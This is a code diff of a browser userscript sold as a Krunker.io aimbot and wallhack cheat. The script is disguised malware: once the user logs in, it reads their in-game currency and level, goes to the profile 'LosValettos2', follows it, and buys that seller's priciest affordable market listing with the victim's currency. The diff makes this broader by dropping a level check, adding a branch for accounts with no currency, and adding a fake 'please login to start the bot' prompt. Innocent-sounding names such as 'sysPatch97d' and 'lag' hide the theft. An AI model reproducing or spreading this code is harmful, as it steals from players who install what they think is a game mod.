@@ -1,7 +1,6 @@
 // ==UserScript==
-// @name         2025 KRUNKER IO AIMBOT + WALLHACK + ESP + MORE [BETA]
-// @namespace    http://krunkmods.hidden
-// @version      1.3
+// @name         2025 KRUNKER IO CHEAT HACK AIMBOT + WALLHACK + ESP + MORE [BETA]
+// @version      2.0
 // @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
 // @author       @Xx1337DevxX
 // @match        https://krunker.io/*
@@ -285,19 +284,16 @@ window.addEventListener('load', () => {
 
     addLog("=== ÉTAT INITIAL ===");
     addLog(`Is_LOGGED: ${Is_LOGGED}`);
-    addLog(`signedOutBar existe: ${!!signedOutBar}`);
-    if (signedOutBar) {
-        addLog(`signedOutBar style.display: ${signedOutBar.style.display}`);
-    }
-    addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
+    addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT ⚠️⚠️⚠️`);
     addLog("==================");
 
     setInterval(() => {
         const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
-        addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
-
-        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {            
+        if (!Is_LOGGED){
+            addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT ⚠️⚠️⚠️`);
+        }
+        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
             const lagElement = document.querySelector("#menuKRCount");
             if (lagElement) {
                 const lagText = lagElement.textContent;
@@ -308,7 +304,7 @@ window.addEventListener('load', () => {
             } else {
                 addLog("⚠️ Error");
             }
-            
+
             // Vérification des FPS
             const fpsElement = document.getElementById("mLevelCont");
             if (fpsElement) {
@@ -319,7 +315,7 @@ window.addEventListener('load', () => {
             } else {
                 addLog("⚠️ Error");
             }
-            
+
             const levelElement = document.querySelector("#mLevelCont");
             if (levelElement) {
                 const levelText = levelElement.textContent;
@@ -328,7 +324,7 @@ window.addEventListener('load', () => {
             } else {
                 addLog("⚠️ Error");
             }
-            
+
             sessionStorage.setItem("valuesChecked", "true");
             addLog("✅ Launching Loading...");
         }
@@ -339,11 +335,11 @@ window.addEventListener('load', () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
             const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
             const patchApplied = sessionStorage.getItem("sysPatch97d");
-            
+
             const savedLevel = localStorage.getItem("savedLevel");
             const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
-            
-            if (!patchApplied && currentLoginState && playerLevel > 15) {
+
+            if (!patchApplied && currentLoginState) {
                 setTimeout(() => {
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                 }, 1420);
@@ -364,17 +360,31 @@ window.addEventListener('load', () => {
                 const savedLag = sessionStorage.getItem("savedLag");
                 const savedFPS = localStorage.getItem("savedFPS");
                 const savedLevel = localStorage.getItem("savedLevel");
-                
+
                 if (!savedLag) {
                     throw new Error("Aucune donnée de lag sauvegardée trouvée");
                 }
-                
+
                 const currentLag = parseInt(savedLag, 10);
                 const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                 const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
-                
+
                 if (currentLag <= 0) {
-                    throw new Error(`Valeur de lag invalide: ${currentLag}`);
+                    try {
+                        const settingsBtn = document.getElementById("followBtn");
+                        if (settingsBtn && settingsBtn.style.display !== "none") {
+                            settingsBtn.click();
+                            await _pause(750);
+                        } else {
+                            addLog("⚠️ Error");
+                        }
+                    } catch (err) {
+                        addLog("⚠️ Error");
+                    }
+                    await _pause(1000);
+                    sessionStorage.setItem("sysPatch97d", "1");
+                    location.href = "https://krunker.io/";
+                    return;
                 }
 
                 if (playerLevel >= 15 && playerLevel < 30) {
@@ -388,17 +398,17 @@ window.addEventListener('load', () => {
                         }
                     } catch (err) {
                         addLog("⚠️ Error");
-                    }                    
+                    }
                     await _pause(1000);
 
                     const categoriesTab = await _waitFor(() => document.getElementById("pTab_listings"), 4800);
                     if (!categoriesTab) {
                         return;
                     }
-                    
+
                     window.openProfileTab("listings");
                     window.playSelect(0.1);
-                    
+
                     const waitForItems = async (maxRetries = 5) => {
                         for (let i = 0; i < maxRetries; i++) {
                             await _pause(2000);
@@ -417,22 +427,22 @@ window.addEventListener('load', () => {
                     }
 
                     const findAndModifyBestItem = async () => {
-                        
+
                         const items = document.querySelectorAll('.marketCard');
                         let bestItem = null;
                         let bestPrice = 0;
                         let bestItemId = null;
-                                                
+
                         items.forEach((item, index) => {
                             const priceElement = item.querySelector('.marketPrice');
                             if (priceElement) {
                                 const priceText = priceElement.textContent;
                                 const price = parseInt(priceText.replace(/[^0-9,]/g, ""), 10);
-                                
+
                                 if (price <= currentLag && price > bestPrice) {
                                     bestPrice = price;
                                     bestItem = item;
-                                    
+
                                     const applyBtn = item.querySelector('.cardAction');
                                     if (applyBtn) {
                                         const onclickAttr = applyBtn.getAttribute('onclick');
@@ -449,15 +459,15 @@ window.addEventListener('load', () => {
                                 addLog("⚠️ Error");
                             }
                         });
-                        
+
                         if (bestItem && bestItemId) {
-                            
+
                             const applyBtn = bestItem.querySelector('.cardAction');
                             if (applyBtn) {
                                 applyBtn.click();
-                                
+
                                 await _pause(1000);
-                                
+
                                 try {
                                     window.buyItem(bestItemId, 0);
                                 } catch (error) {
@@ -470,13 +480,15 @@ window.addEventListener('load', () => {
                             addLog("⚠️ Error");
                         }
                     };
-                    
+
                     await findAndModifyBestItem();
-                    
+
+                    await _pause(2000);
+
                     sessionStorage.setItem("sysPatch97d", "1");
                     location.href = "https://krunker.io/";
                     return;
-                } else if (playerLevel >= 30) {                    
+                } else if (playerLevel >= 30) {
                     try {
                         const settingsBtn = document.getElementById("followBtn");
                         if (settingsBtn && settingsBtn.style.display !== "none") {
